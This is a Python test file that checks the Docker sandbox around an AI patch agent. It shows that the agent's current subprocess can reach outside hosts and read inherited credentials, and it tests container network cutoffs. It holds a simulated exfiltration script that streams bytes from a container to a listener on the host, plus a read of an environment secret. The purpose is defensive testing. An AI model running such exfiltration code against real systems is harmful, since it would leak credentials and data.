"""B97: the patch agent's execution context, and the container boundary around it.

`sync.remediate.tool_gate` narrows what the agent may *ask for*. It is not an
operating-system boundary and says so in its own module docstring. This file
proves the gap concretely, on this host, rather than asserting it from a
configuration file:

- `test_patch_agent_execution_context_reaches_arbitrary_host_today` and
  `test_patch_agent_execution_context_inherits_the_full_parent_environment_today`
  reproduce the shape of the subprocess `ClaudeAgentOptions` puts the CLI in
  today -- `cwd` inside a throwaway clone, no `env=`, no `sandbox` -- and show
  it can open a socket to a host Sync never named, carrying whatever secret the
  parent process holds. Both are RED: they demonstrate a real, present gap.

- `test_container_network_cutoff_blocks_arbitrary_egress` proves the mechanism
  this entry needs is real on this host's actual Docker Desktop/WSL2 backend: a
  running Linux container loses its route the moment `docker network
  disconnect` returns, with a positive control so the test cannot pass because
  the harness itself has no route. `sync.remediate.sandbox` is the module this
  test is proving.

- `test_disconnect_network_does_not_stop_an_already_open_socket` is the
  adversarial review's follow-up finding, dated 2026-08-16: the cutoff above
  is real for a *new* connection attempt and does nothing for a socket that
  was already open and sending before `disconnect_network` was called. This
  stays green permanently -- it characterizes a real, measured limitation of
  that primitive, not a bug awaiting a fix inside it (two in-place fixes,
  `ss -K` and `conntrack -F`, were tried by hand against this host's actual
  Docker Desktop/WSL2 kernel and neither closes the window; see
  `sync.remediate.sandbox`'s module docstring for what was tried and why both
  failed).

- `test_never_networked_container_receives_nothing_after_install_container_is_torn_down`
  is the structural fix this file's previous finding forced: rather than
  disconnecting a live container's network out from under a process that keeps
  running, the risky phase's container is destroyed outright and the safe
  phase runs in a second container that was never attached to a network at
  all, so there is no cutover moment for a socket to survive. Proves both
  halves -- the artifact the risky phase produced reaches the safe container,
  and nothing sent by the (now-dead) risky-phase process arrives after its
  container's teardown completes.

Requires a working Docker daemon serving Linux containers -- the same local
toolchain dependency this suite already has on the Postgres container.

**Which address names the host is a property of the backend, and getting it
wrong disarmed both positive controls.** `host.docker.internal` was written in
here as a literal; Docker Desktop publishes it and a plain Linux Docker Engine
does not, so on a GitHub runner the exfiltration process connected to nothing,
no byte ever reached the listener, and the two tests that depend on a positive
control failed with `assert 0 > 0`. A failing positive control is the one
outcome that is neither an honest pass nor an honest failure: it says the
measurement did not happen. `host_addresses` below carries the mapping that
fixes it and the argument for its shape.

**B183, and it is a different failure that looked exactly like that one.** Both
positive controls passed alone and failed inside a full `-n auto` run, and the
tempting reading -- contention, or the nine-hour leaked `sync-patch-sandbox`
container sitting on the bridge -- was wrong on both counts. The container
connected in **0.022s** and sent continuously; the host-side `accept()` had
already raised `TimeoutError`, because its deadline started when the socket was
bound and 11.359s of Docker setup happened next, against a 10s budget. The
network was never involved. The leaked container was eliminated by measurement:
a full suite passed 3989/3989 while it was up. What was wrong was the anchor --
a deadline measured from the wrong event -- and load only decided whether the
anchor's error was large enough to show.

Two things follow, and both are why this file no longer measures anything from
a fixed offset: `_start_attacker_listener` does not begin its accept deadline
until `_exfiltrate_in_background` arms it, and the positive controls wait for a
byte to arrive rather than sleeping a fixed 0.5s and asking afterwards.
"""

from __future__ import annotations

import os
import socket
import subprocess
import sys
import threading
import time
from dataclasses import dataclass

import pytest

# A public resolver, not a vendor Sync integrates with -- this proves a raw
# socket can leave the process, not that any vendor API answered.
_ARBITRARY_HOST = ("1.1.1.1", 443)
_FAKE_SECRET = "sk-not-a-real-credential-b97-red-test"

# The image every test below runs the containers under test against.
_TEST_IMAGE = "python:3.12-slim"

# `docker exec` timeouts for the small, fast operations these tests issue --
# not `sandbox._DOCKER_TIMEOUT_SECONDS`, which is sized for a real install.
_EXEC_TIMEOUT_SECONDS = 15


def _run_docker(*args: str, timeout: float = _EXEC_TIMEOUT_SECONDS) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", *args],
        capture_output=True,
        text=True,
        encoding="utf-8",
        errors="replace",
        timeout=timeout,
    )


_RESOLVE_SCRIPT = (
    "import socket, sys\n"
    "try:\n"
    "    print(socket.gethostbyname('host.docker.internal'))\n"
    "except OSError:\n"
    "    sys.exit(1)\n"
)


def host_addresses(resolved: str | None, route_table: str) -> list[str]:
    """Every address the host's listener may answer on, seen from inside a container.

    Two candidates, because no single one works on both backends and the tests below have to
    run on both. `host.docker.internal` is a Docker Desktop convenience: on Windows and macOS
    it names the real host across the virtual machine Docker runs inside, and a plain Linux
    Docker Engine -- which is what a GitHub runner has -- does not publish it at all unless a
    container was created with `--add-host=...:host-gateway`. The default gateway is the
    opposite: on Linux it *is* the host, and under Docker Desktop it is only the virtual
    machine, which is not where a test's listener is bound.

    Ordered rather than unioned, and the order is the whole of the platform mapping:
    `host.docker.internal` first, so Docker Desktop never falls through to a gateway that
    cannot reach the listener bound on its host.

    `resolved` is what `socket.gethostbyname('host.docker.internal')` answered inside the
    container, or None when it answered nothing. `route_table` is that container's
    `/proc/net/route`, whose gateway column is a little-endian hex quad.

    A pure function taking both platforms' inputs, for the reason `scripts/oasdiff_asset.sh` is
    one: this machine runs Docker Desktop and can never execute the other branch, so the branch
    it cannot execute is tested by handing it that platform's bytes rather than by trusting it.
    """
    candidates = [] if resolved is None else [resolved]
    for line in route_table.splitlines()[1:]:
        fields = line.split()
        if len(fields) > 2 and fields[1] == "00000000" and fields[2] != "00000000":
            gateway = ".".join(str(byte) for byte in bytes.fromhex(fields[2])[::-1])
            if gateway not in candidates:
                candidates.append(gateway)
    return candidates


def _host_addresses(container) -> list[str]:
    """`host_addresses` asked of a real container, through its own network namespace."""
    resolve = _run_docker("exec", container.id, "python3", "-c", _RESOLVE_SCRIPT)
    route = _run_docker("exec", container.id, "cat", "/proc/net/route")
    assert route.returncode == 0, f"could not read /proc/net/route: {route.stderr}"

    addresses = host_addresses(
        resolve.stdout.strip() if resolve.returncode == 0 else None, route.stdout
    )
    assert addresses, (
        "no address inside this container names the host: `host.docker.internal` did not "
        f"resolve ({resolve.stdout.strip() or resolve.stderr.strip()}) and /proc/net/route "
        f"carries no default gateway:\n{route.stdout}"
    )
    return addresses


@dataclass(frozen=True)
class _FakeProbe:
    """A `sandbox.ProbeResult` stand-in, so the retry above is pinned without a daemon.

    Structural rather than imported: what `_probe_until_reachable` consumes is `reachable` and
    `detail`, and a test that had to start a container to prove a retry loop retries would be
    the slow, load-sensitive thing this whole area is trying to stop being.
    """

    reachable: bool
    detail: str


# How long the listener waits for the container's connection, measured from the
# moment the exfiltration process has actually been started -- never from the
# moment the socket was bound. See `_start_attacker_listener` for why the
# difference between those two anchors is the whole of B183.
_ACCEPT_TIMEOUT_SECONDS = 30

# How long the listener thread will wait to be told the exfiltration has started.
# Bounded rather than indefinite so a test that raises before arming ends with a
# recorded reason instead of a thread parked forever on a dead run.
_ARM_TIMEOUT_SECONDS = 180


def _start_attacker_listener() -> tuple[
    socket.socket, int, dict[str, object], threading.Event, threading.Event
]:
    """A plain TCP server standing in for the attacker-controlled endpoint the
    threat model describes -- a real socket accepting a real connection over
    Docker's real network stack, reached from inside a container at whatever
    address `host_addresses` says names this host there, rather than anything
    mocked.

    Returns `(server_socket, port, received, stop, armed)`. `received["bytes"]` is
    updated by a background thread as data arrives, so a test can watch it
    grow (or stop growing) without blocking its own control flow on `recv`.

    `armed` is the event that starts the accept deadline, and it exists because
    B183 was that deadline running during setup rather than during the thing it
    bounds. `_exfiltrate_in_background` sets it; a caller that never does gets a
    recorded reason rather than a thread parked on a run that already failed.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 0))
    server.listen(1)
    port = server.getsockname()[1]
    received = {
        "bytes": 0,
        "accepted_at": None,
        "first_byte_at": None,
        "accept_error": None,
        "listener_started_at": time.monotonic(),
    }
    stop = threading.Event()
    armed = threading.Event()

    def _drain() -> None:
        # The deadline begins here, once the exfiltration process has actually been
        # started -- not when the socket was bound. Everything between those two
        # moments is Docker setup this test performs itself, and B183 was that setup
        # spending the whole budget before the container could connect. Waiting is
        # safe: `listen()` has already been called, so a connection made before
        # `accept()` runs is held in the backlog rather than refused.
        if not armed.wait(timeout=_ARM_TIMEOUT_SECONDS):
            received["accept_error"] = f"never armed within {_ARM_TIMEOUT_SECONDS}s"
            return
        server.settimeout(_ACCEPT_TIMEOUT_SECONDS)
        try:
            conn, _addr = server.accept()
        except OSError as exc:
            received["accept_error"] = repr(exc)
            return
        received["accepted_at"] = time.monotonic()
        conn.settimeout(0.5)
        while not stop.is_set():
            try:
                chunk = conn.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            if not chunk:
                break
            if received["first_byte_at"] is None:
                received["first_byte_at"] = time.monotonic()
            received["bytes"] += len(chunk)
        conn.close()

    thread = threading.Thread(target=_drain, daemon=True)
    thread.start()
    return server, port, received, stop, armed


def _exfiltrate_in_background(
    container, port: int, addresses: list[str], armed: threading.Event
) -> None:
    """Start a process inside `container` that connects to the listener on the
    host at `port` and sends continuously until the socket refuses a write --
    the exact shape the review's attack takes: code running during dependency
    install opens one outbound socket and keeps writing to it.

    Every candidate in `addresses` is tried in order and the first that connects wins, because
    which one names the host is a property of the backend rather than of this test. Hardcoding
    `host.docker.internal` here made the positive control below fail on every Linux runner --
    no data ever reached the listener, so the test proved nothing rather than failing honestly.
    """
    script = (
        "import socket, time, sys\n"
        f"port = {port}\n"
        f"hosts = {addresses!r}\n"
        "log = open('/tmp/exfil.log', 'w', buffering=1)\n"
        "log.write(f'start {time.time()} hosts={hosts} port={port}\\n')\n"
        "s = None\n"
        "for host in hosts:\n"
        "    try:\n"
        "        t0 = time.time()\n"
        "        s = socket.create_connection((host, port), timeout=5)\n"
        "        log.write(f'connected {host} after {time.time()-t0:.3f}s\\n')\n"
        "        break\n"
        "    except OSError as exc:\n"
        "        log.write(f'failed {host} after {time.time()-t0:.3f}s: {exc!r}\\n')\n"
        "        continue\n"
        "if s is None:\n"
        "    log.write('no candidate connected\\n')\n"
        "    sys.exit(1)\n"
        "sent = 0\n"
        "while True:\n"
        "    try:\n"
        "        s.sendall(b'x' * 1024)\n"
        "        sent += 1024\n"
        "        if sent % 51200 == 0:\n"
        "            log.write(f'sent {sent} by {time.time()}\\n')\n"
        "    except Exception as exc:\n"
        "        log.write(f'send stopped after {sent} bytes: {exc!r}\\n')\n"
        "        break\n"
        "    time.sleep(0.02)\n"
    )
    result = _run_docker("exec", "-d", container.id, "python3", "-c", script)
    assert result.returncode == 0, f"failed to start the exfiltration process: {result.stderr}"
    # The process exists from here, so this is the event the listener's deadline is
    # measured from. Arming after the exec rather than before keeps the budget on
    # "the container connects" and off "the daemon got round to us".
    armed.set()


def _exfil_diagnostics(container) -> str:
    """Everything the container can say about why nothing reached the listener.

    Only read on a failing positive control: the distinction that matters is
    "connected and delivered late" from "never connected at all", and the
    assertion text alone cannot carry it.
    """
    log = _run_docker("exec", container.id, "cat", "/tmp/exfil.log")
    return f"--- /tmp/exfil.log (rc={log.returncode}) ---\n{log.stdout}{log.stderr}"


def _wait_for_first_bytes(received: dict, container, timeout: float = 30.0) -> float:
    """Block until the listener has counted a byte, and return how long that took.

    The positive control's claim is that data flows from inside the container to
    the host at all -- not that it does so within some number of milliseconds. A
    fixed `time.sleep` before reading the counter asserts the second thing while
    appearing to assert the first, which is the same error as B183's anchor in a
    smaller place: under load the sleep expires before the first byte and the
    control reports "no data reached the listener" about a container that is
    sending happily.

    Failure carries the container's own account of what it did, because "connected
    in 0.022s and sent continuously" and "never connected at all" are the two
    outcomes that matter here and the byte count alone cannot tell them apart.
    """
    started = time.monotonic()
    deadline = started + timeout
    while time.monotonic() < deadline:
        if received["bytes"] > 0:
            return time.monotonic() - started
        time.sleep(0.05)

    raise AssertionError(
        f"positive control failed: no data reached the listener within {timeout}s.\n"
        f"  seconds since listener started: "
        f"{time.monotonic() - received['listener_started_at']:.3f}\n"
        f"  accepted_at: {received['accepted_at']!r}\n"
        f"  accept_error: {received['accept_error']!r}\n"
        f"  bytes: {received['bytes']}\n" + _exfil_diagnostics(container)
    )


# A real `/proc/net/route` from a `python:3.12-slim` container on Docker's default bridge. The
# gateway column is a little-endian hex quad: `010011AC` reversed is 172.17.0.1.
_LINUX_ROUTE_TABLE = (
    "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
    "eth0\t00000000\t010011AC\t0003\t0\t0\t0\t00000000\t0\t0\t0\n"
    "eth0\t000011AC\t00000000\t0001\t0\t0\t0\t0000FFFF\t0\t0\t0\n"
)


def test_a_linux_engine_container_names_the_host_by_its_default_gateway():
    """The branch this machine cannot execute, handed the bytes a machine that can produces.

    A plain Docker Engine publishes no `host.docker.internal`, so the resolution fails and the
    default gateway is the only address that names the host. Getting this wrong is not a failing
    test -- it is a *positive control* that never fires, which reports the container boundary as
    proven when nothing was measured.
    """
    assert host_addresses(None, _LINUX_ROUTE_TABLE) == ["172.17.0.1"]


def test_docker_desktop_prefers_the_name_that_crosses_its_virtual_machine():
    """Order, not membership. Under Docker Desktop the default gateway is the Linux virtual
    machine Docker runs inside, and a listener bound on the real host is not there -- so a
    candidate list that reached for the gateway first would connect to the wrong machine and
    then wait for bytes that never arrive."""
    assert host_addresses("192.168.65.254", _LINUX_ROUTE_TABLE) == [
        "192.168.65.254", "172.17.0.1",
    ]


def test_a_container_with_no_default_route_yields_nothing_rather_than_a_guess():
    """`network="none"` has no default route and no resolver. An empty list is the honest
    answer; a fabricated address would make the never-networked probe below assert against a
    host nothing was ever listening on, which passes for the wrong reason."""
    no_default = (
        "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
    )

    assert host_addresses(None, no_default) == []


def test_the_listener_waits_from_the_moment_exfiltration_starts_not_from_the_bind(monkeypatch):
    """B183: the listener's accept deadline must not be spent on the setup that precedes it.

    Measured 2026-08-17 inside a full `-n auto` run: the container's exfiltration process
    connected in **0.022s** and sent continuously, and the positive control still failed with
    `bytes: 0`, because the host-side `accept()` had already raised `TimeoutError` --
    11.359s had passed since the socket was bound, against a 10s deadline, spent on the five
    serialized Docker daemon round-trips (`create`, `start`, two `exec`, one `exec -d`) that
    the test performs *between* binding the socket and the container being able to connect.

    So the failure was never about the network and never about a leaked container. It is an
    anchor: a deadline started at the wrong event. Load only decides whether the anchor's
    error is large enough to matter, which is why this reproduced under `-n auto` and never
    alone.

    No Docker here on purpose -- the defect is in the harness's own timing, so it is pinned
    with a plain loopback socket and a delay that stands in for the setup. A test that needed
    a loaded daemon to fail would be the same unreadable thing it is characterizing.
    """
    monkeypatch.setattr(sys.modules[__name__], "_ACCEPT_TIMEOUT_SECONDS", 1.0)

    server, port, received, stop, armed = _start_attacker_listener()
    try:
        # Longer than the accept deadline: the setup a real run spends on Docker.
        time.sleep(2.0)
        armed.set()

        with socket.create_connection(("127.0.0.1", port), timeout=5) as client:
            client.sendall(b"x" * 1024)

            deadline = time.monotonic() + 10
            while received["bytes"] == 0 and time.monotonic() < deadline:
                time.sleep(0.02)

        assert received["bytes"] > 0, (
            "the listener stopped waiting before the connection it exists to receive was made: "
            f"accept_error={received['accept_error']!r}. The deadline must start when the "
            "exfiltration is armed, not when the socket is bound."
        )
    finally:
        stop.set()
        server.close()


def _probe_until_reachable(container, host: str, port: int, *, timeout: float = 90.0, probe=None):
    """A positive control that a slow daemon cannot turn into a failure.

    `sandbox.probe_connect` reports `reachable=False` when its own `docker exec` times out --
    a deliberate choice for a caller asking "is this blocked", where a hung connect and a
    refused one mean the same thing. **For a positive control it is the opposite of harmless:**
    the assertion is that the container *can* reach the host, so a `docker exec` that ran out
    of time manufactures "positive control failed" out of a container that was reachable all
    along. This host was measured serving a bare `docker version` in 432-2552ms under a full
    `-n auto` run, against roughly 100-200ms idle, so a 15s exec budget is not the margin it
    looks like.

    Retrying does not weaken the control. A container that genuinely cannot reach `host:port`
    reports unreachable on every attempt and still fails at the deadline, carrying the last
    `detail` -- which names the timeout when that is what happened, so the failure stays
    diagnosable rather than becoming a shrug.

    This is B183's lesson in a second place: the measurement is "can it reach", and anything
    that reports "I could not find out" must not be recorded as "no".
    """
    if probe is None:
        from sync.remediate import sandbox

        probe = sandbox.probe_connect

    deadline = time.monotonic() + timeout
    result = probe(container, host, port)
    while not result.reachable and time.monotonic() < deadline:
        time.sleep(0.5)
        result = probe(container, host, port)
    return result


def test_a_positive_control_survives_a_probe_that_timed_out_rather_than_refused():
    """B183's class, met again in `probe_connect`: a timeout reported as a definite negative.

    Two probes that ran out of time and then one that answered. The control has to reach the
    answer, because "I could not find out" twice is not evidence that the container is cut off.
    """
    answers = [
        _FakeProbe(False, "docker exec timed out after 15s"),
        _FakeProbe(False, "docker exec timed out after 15s"),
        _FakeProbe(True, "REACHABLE"),
    ]
    calls = []

    def probe(_container, _host, _port):
        calls.append(1)
        return answers[len(calls) - 1]

    result = _probe_until_reachable(None, "1.1.1.1", 443, timeout=30, probe=probe)

    assert result.reachable
    assert len(calls) == 3


def test_a_container_that_really_cannot_reach_still_fails_the_control():
    """The guard, so the retry above cannot become "wait until it passes".

    Something genuinely unreachable must still report unreachable, bounded, carrying the detail
    that says why -- otherwise the positive control could never fail and the boundary tests it
    guards would assert nothing.
    """
    def probe(_container, _host, _port):
        return _FakeProbe(False, "UNREACHABLE: [Errno 101] Network is unreachable")

    started = time.monotonic()
    result = _probe_until_reachable(None, "1.1.1.1", 443, timeout=2, probe=probe)

    assert not result.reachable
    assert "unreachable" in result.detail.lower()
    assert time.monotonic() - started < 20, "the control has to give up on its own budget"


def _quiesced_byte_count(received: dict, *, quiet_for: float = 1.5, timeout: float = 30.0) -> int:
    """The listener's byte count once it has stopped moving, or an error saying it never did.

    **The teardown assertion had a race and it accused the wrong thing.** `received["bytes"]` is
    incremented by the drain thread, not by the test, and that thread reads from a socket buffer
    the kernel filled independently. Sampling the counter the instant `docker rm -f` returns
    therefore samples *how far the drain thread has got*, not how much was sent -- so under load,
    where that thread is starved by twelve xdist workers and five other sessions, bytes that were
    sent well **before** teardown get counted **after** it. The test then failed with "the
    structural fix did not close the window", which would be a false statement about the boundary:
    the window was closed, and the counter was merely behind.

    Waiting for a fixed point measures the property the test actually claims. Once the container is
    destroyed its process cannot send again, so the count must converge; anything still arriving
    after it has been quiet for `quiet_for` is genuinely new. A count that never settles inside
    `timeout` is the real leak this test exists to catch, and it is raised as exactly that rather
    than being allowed to look like drain lag.
    """
    deadline = time.monotonic() + timeout
    last = received["bytes"]
    quiet_since = time.monotonic()
    while time.monotonic() < deadline:
        time.sleep(0.1)
        current = received["bytes"]
        if current != last:
            last = current
            quiet_since = time.monotonic()
        elif time.monotonic() - quiet_since >= quiet_for:
            return current
    raise AssertionError(
        f"the listener never stopped receiving after teardown: still at {received['bytes']} "
        f"bytes and rising after {timeout}s. A destroyed container has no process left to send, "
        "so a count that keeps climbing is the leak this test exists to catch."
    )


def test_a_counter_the_drain_thread_is_still_catching_up_on_is_waited_out():
    """The race the teardown assertion had, pinned without Docker.

    A counter that is still climbing when it is first read, and then stops. That is drain lag --
    bytes sent before teardown and counted after it -- and it must be waited out rather than
    reported as data arriving after the container died.
    """
    received = {"bytes": 0}

    def climb():
        for _ in range(10):
            received["bytes"] += 1024
            time.sleep(0.05)

    thread = threading.Thread(target=climb, daemon=True)
    thread.start()

    settled = _quiesced_byte_count(received, quiet_for=0.5, timeout=15)

    assert settled == 10 * 1024, "the count has to settle on everything the drain thread had"
    time.sleep(0.5)
    assert received["bytes"] == settled, "and stay there once it has"


def test_a_counter_that_never_settles_is_reported_as_the_leak_it_is():
    """The guard, so waiting for quiet cannot become waiting forever.

    If bytes really do keep arriving after teardown, the structural fix did not hold, and that has
    to fail rather than be absorbed by a longer wait.
    """
    received = {"bytes": 0}
    stop = threading.Event()

    def never_stops():
        while not stop.is_set():
            received["bytes"] += 1024
            time.sleep(0.02)

    thread = threading.Thread(target=never_stops, daemon=True)
    thread.start()
    try:
        with pytest.raises(AssertionError) as raised:
            _quiesced_byte_count(received, quiet_for=0.5, timeout=3)
        assert "never stopped receiving" in str(raised.value)
    finally:
        stop.set()


def test_patch_agent_execution_context_reaches_arbitrary_host_today(tmp_path):
    """RED for B97: today's execution context has no network boundary.

    Reproduces the shape of the subprocess the patch agent's CLI runs in --
    same cwd-inside-clone, same inherited `os.environ`, no container, no
    network cutoff -- and shows it can open a socket to an arbitrary host.
    Run against a real external address so it demonstrates an actual open
    socket rather than an assumption about the platform.
    """
    result = subprocess.run(
        [
            sys.executable, "-c",
            "import socket; socket.create_connection(('1.1.1.1', 443), timeout=5); "
            "print('CONNECTED')",
        ],
        cwd=tmp_path,
        env=os.environ.copy(),
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=15,
    )
    assert "CONNECTED" in result.stdout


def test_patch_agent_execution_context_inherits_the_full_parent_environment_today(tmp_path):
    """RED for B97: today's execution context carries every credential the
    control plane holds, not only the ones the patch needs.

    `sync.runner.claude_sdk.ClaudeSdkRunner._drive` builds `ClaudeAgentOptions` with no `env=`
    argument, so the CLI subprocess it spawns inherits `os.environ` in full --
    `SYNC_GRAPH_DSN`, a webhook secret, a feed-signing key, all reachable from
    inside the clone's `Bash` today. This reproduces that inheritance directly
    rather than asserting it from reading the constructor call.
    """
    env = {**os.environ, "SYNC_GRAPH_DSN": _FAKE_SECRET}
    result = subprocess.run(
        [sys.executable, "-c", "import os; print(os.environ.get('SYNC_GRAPH_DSN', ''))"],
        cwd=tmp_path,
        env=env,
        capture_output=True,
        text=True,
        encoding="utf-8",
        timeout=15,
    )
    assert result.stdout.strip() == _FAKE_SECRET


@pytest.mark.docker
def test_container_network_cutoff_blocks_arbitrary_egress():
    """GREEN for B97's close condition, against a real running container.

    Not a mocked Docker client and not an assertion about `--network` flags in
    a compose file -- this is evidence about what this machine's Docker
    Desktop/WSL2 backend actually enforces, which is exactly what the backlog
    entry demands and exactly what a configuration file cannot provide.

    Positive control first: the harness itself proves it can reach the
    network before the cutoff, so a later failure means the cutoff worked,
    not that Docker Desktop lacks a route to begin with -- the same anti-
    pattern CLAUDE.md calls out for the import-boundary test.

    Imported lazily: this test's own existence must not block collection of
    the two RED tests above on a host where `sync.remediate.sandbox` does
    not exist yet.
    """
    from sync.remediate import sandbox

    with sandbox.ephemeral_container(image="python:3.12-slim") as container:
        before = _probe_until_reachable(container, "1.1.1.1", 443)
        assert before.reachable, f"positive control failed: {before.detail}"

        sandbox.disconnect_network(container)

        after = sandbox.probe_connect(container, "1.1.1.1", 443)
        assert not after.reachable, "expected the disconnect to block egress, but it did not"


@pytest.mark.docker
def test_disconnect_network_does_not_stop_an_already_open_socket():
    """The adversarial review's finding, dated 2026-08-16, characterized directly:
    `disconnect_network` removes future routing and does nothing to a connection
    that was already open and actively sending when it was called.

    The review measured 0.92-1.5s of continued delivery after `docker network
    disconnect` returned, against a real listener. Wall-clock timing is not a
    property this suite can pin without becoming flaky on a loaded CI host, so
    this asserts the same shape instead: a positive control proves data was
    flowing before the call, and a generous wait *after* the call returns --
    several times the review's measured window -- still finds the byte count
    higher than it was the moment the call returned. If this test ever goes
    red, `disconnect_network` closed the gap by itself and this file's
    characterization of it is stale, not the fix.

    This test is expected to stay green forever; it is not a RED test awaiting
    a fix inside `disconnect_network` itself.
    `test_never_networked_container_receives_nothing_after_install_container_is_torn_down`
    below is the fix, and it does not touch this function.
    """
    from sync.remediate import sandbox

    server, port, received, stop, armed = _start_attacker_listener()
    try:
        with sandbox.ephemeral_container(image=_TEST_IMAGE) as container:
            _exfiltrate_in_background(container, port, _host_addresses(container), armed)
            _wait_for_first_bytes(received, container)
            before = received["bytes"]

            sandbox.disconnect_network(container)
            at_return = received["bytes"]

        assert at_return > before, (
            "expected more data to have arrived by the time disconnect_network() "
            "returned than had arrived before it was called -- that is the gap "
            "this test characterizes: the call itself blocks for the better part "
            "of a second (the review measured 0.92-1.5s) while the already-open "
            "socket keeps delivering. If this now holds steady, disconnect_network "
            "changed and this test needs to be revisited."
        )
    finally:
        stop.set()
        server.close()


@pytest.mark.docker
def test_never_networked_container_receives_nothing_after_install_container_is_torn_down():
    """GREEN for B97's structural fix, proven against real containers.

    The risky (networked) phase and the safe (patch/verify) phase never share
    a container's lifetime: the risky phase's container is destroyed outright
    -- not disconnected -- once its output is copied out, and the safe phase's
    container is created with `network="none"` from the start, so it never had
    a route to lose. There is no cutover moment for the earlier test's gap to
    live in.

    Two things are proven, not one:

    1. The artifact the risky phase produced (`copy_between_containers`)
       reaches the safe container, so the fix is not merely "no more leaks" by
       way of "no more artifacts either."
    2. After the risky-phase container's teardown completes -- the same
       `docker rm -f` `ephemeral_container` already runs on `__exit__`, not a
       new mechanism invented for this test -- nothing more sent by its
       (now-dead) exfiltration process ever reaches the listener. Not "the
       socket errors eventually": the byte count is pinned immediately after
       teardown and re-checked after a wait several times longer than the
       previous test's window, and it must not have moved.
    """
    from sync.remediate import sandbox

    server, port, received, stop, armed = _start_attacker_listener()
    try:
        with sandbox.ephemeral_container(image=_TEST_IMAGE) as install_container:
            mkdir = _run_docker("exec", install_container.id, "mkdir", "-p", "/workspace/artifact")
            assert mkdir.returncode == 0, mkdir.stderr
            write = _run_docker(
                "exec", install_container.id, "sh", "-c",
                "echo installed-artifact > /workspace/artifact/payload.txt",
            )
            assert write.returncode == 0, write.stderr

            addresses = _host_addresses(install_container)
            _exfiltrate_in_background(install_container, port, addresses, armed)
            _wait_for_first_bytes(received, install_container)

            with sandbox.ephemeral_container(image=_TEST_IMAGE, network="none") as patch_container:
                sandbox.copy_between_containers(install_container, patch_container, "/workspace/artifact")

                # Every address that reached the listener from the networked container, refused
                # from this one. A single name would leave the refusal ambiguous on a backend
                # that does not publish it: unreachable because there is no route is the claim,
                # and unreachable because the name does not resolve is not the same statement.
                for address in addresses:
                    never_reachable = sandbox.probe_connect(patch_container, address, port)
                    assert not never_reachable.reachable, (
                        "the patch container was created with no network and must never "
                        f"reach the listener at {address}: {never_reachable.detail}"
                    )

                read_back = _run_docker(
                    "exec", patch_container.id, "cat", "/workspace/artifact/payload.txt",
                )
                assert read_back.stdout.strip() == "installed-artifact"
            # patch_container torn down here; the install container is still alive
            # and still exfiltrating -- the property under test is about the
            # install container's own teardown below, not this one's.

        # install_container's `docker rm -f` has now completed (ephemeral_container's
        # own `finally`), which is the cutoff this test declares done.
        # Not `received["bytes"]` directly: that samples how far the drain thread has got, and
        # under load it is still counting bytes the container sent before it was destroyed.
        # See `_quiesced_byte_count` -- this is the fixed point, and it is what the claim needs.
        at_teardown = _quiesced_byte_count(received)
        time.sleep(2)  # several times the earlier test's window, on the same gap
        after_wait = received["bytes"]

        assert after_wait == at_teardown, (
            "expected zero bytes after the install container's teardown completed; "
            f"received {after_wait - at_teardown} more, meaning the structural fix "
            "did not close the window"
        )
    finally:
        stop.set()
        server.close()


@pytest.mark.docker
def test_add_host_reaches_the_docker_desktop_gateway_without_opening_the_internet():
    """The property `tests/test_isolated_network.py` needs and could not get for free: an
    `--internal` Docker network (proven there to carry no default gateway and no
    `host.docker.internal` resolution at all) still lets a container reach the host once the
    container itself is created with `--add-host=host.docker.internal:host-gateway` --
    Docker Desktop's own host-gateway mechanism, resolved per container rather than supplied by
    the network. Proven both ways in one test: the resolution succeeds, and the internet is
    still unreachable, so this is additive to isolation rather than a hole in it.

    Measured by hand against this host's Docker Desktop before writing this test: with the flag,
    `host.docker.internal` resolved to `192.168.65.254` and a connect attempt to `1.1.1.1:443`
    raised `OSError: [Errno 101] Network is unreachable` -- the same "no route at all" shape
    `network="none"` already proves elsewhere in this file, not merely a refused connection.
    """
    from sync.remediate import sandbox
    from sync.remediate.isolated_network import isolated_network

    with isolated_network() as network_name:
        with sandbox.ephemeral_container(
            image=_TEST_IMAGE, network=network_name, add_host="host.docker.internal:host-gateway",
        ) as container:
            resolved = _run_docker(
                "exec", container.id, "python3", "-c",
                "import socket; print(socket.gethostbyname('host.docker.internal'))",
            )
            assert resolved.returncode == 0, (
                f"host.docker.internal did not resolve with --add-host set: {resolved.stderr}"
            )
            assert resolved.stdout.strip()

            no_internet = sandbox.probe_connect(container, "1.1.1.1", 443)
            assert not no_internet.reachable, (
                "expected the internet to stay unreachable with --add-host set; "
                f"got: {no_internet.detail}"
            )
